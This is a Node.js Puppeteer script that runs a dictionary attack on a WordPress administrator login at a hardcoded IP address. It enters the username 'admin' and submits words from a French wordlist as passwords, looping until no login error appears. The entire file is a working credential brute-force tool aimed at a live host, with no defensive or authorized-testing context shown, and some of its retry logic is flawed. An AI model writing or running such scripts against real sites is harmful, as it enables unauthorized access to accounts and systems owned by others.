const fs = require("fs");
const puppeteer = require("puppeteer");
let data = fs.readFileSync("./French.dic", "utf8");
let dico = data.replace(/(?:\r\n|\r|\n)/g, " ").split(" ");
let buffer = 0;

async function launch() {
  const browser = await puppeteer.launch({
    headless: false,
    defaultViewport: null,
  });
  const page = await browser.newPage();
  await page.goto("http://35.180.242.197/wp-admin");
  navigate(page);
}

async function navigate(page) {
  //fill login
  await page.$eval("input[name=log]", (el) => (el.value = "admin"));
  await checkMatch(page, dico[buffer])
}

function end(){
    console.log("a")
}

async function checkMatch(page, pass) {
/*   result = await page.evaluate(() => document.querySelector("input[name=pwd]"));
  result.value = pass; */
    await page.type('#user_pass',pass);
    await page.waitForSelector("#wp-submit");
    await page.click("#wp-submit");
    
  error = await page.waitForSelector("#login_error");
  if (error) {
      console.log(dico[buffer])
    return await checkMatch(page,dico[buffer++]);
  }
  end();
}
launch()
//dictonaryCrack();